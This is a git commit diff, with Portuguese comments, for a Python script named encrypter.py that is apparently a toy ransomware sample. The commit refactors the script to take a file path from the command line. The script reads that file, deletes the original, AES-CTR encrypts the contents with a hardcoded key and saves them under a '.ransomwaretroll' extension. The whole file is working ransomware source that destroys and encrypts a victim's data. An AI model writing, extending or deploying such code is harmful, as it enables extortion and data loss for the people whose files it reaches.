36a995a5b678e54654f7ef31828dad5b57c12834
André Ferreira da Cruz <64928745+FerreirAndre@users.noreply.github.com>
2024-12-18 23:46:33 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,29 @@
+import sys
 import os
 import pyaes
 
 ## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+def main():
+    if len(sys.argv) <= 1:
+        print("you need to pass a file as an argument")
+        return
+    file_name = sys.argv[1] 
+    file = open(file_name, "rb")
+    file_data = file.read()
+    file.close()
 
-## remover o arquivo
-os.remove(file_name)
+    os.remove(file_name)
+    key = str.encode("testeransomwares")
+    aes = pyaes.AESModeOfOperationCTR(key)
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+    ## criptografar o arquivo
+    crypto_data = aes.encrypt(file_data)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+    ## salvar o arquivo criptografado
+    new_file = file_name + ".ransomwaretroll"
+    new_file = open(f'{new_file}','wb')
+    new_file.write(crypto_data)
+    new_file.close()
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+if __name__ == '__main__':
+    main()
